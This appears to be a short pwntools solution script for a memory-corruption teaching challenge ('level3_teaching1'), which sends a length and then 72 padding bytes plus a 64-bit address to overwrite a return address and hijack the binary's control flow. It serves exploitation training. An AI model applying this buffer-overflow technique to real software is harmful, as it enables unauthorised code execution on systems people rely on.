import pwn

io = pwn.process("/challenges/mem/level3_teaching1")

io.send("80\n")

payload = bytes([0x0]*72) + pwn.p64(0x4017d1)

io.send(payload)

output = io.readall().decode('ascii')
print(output)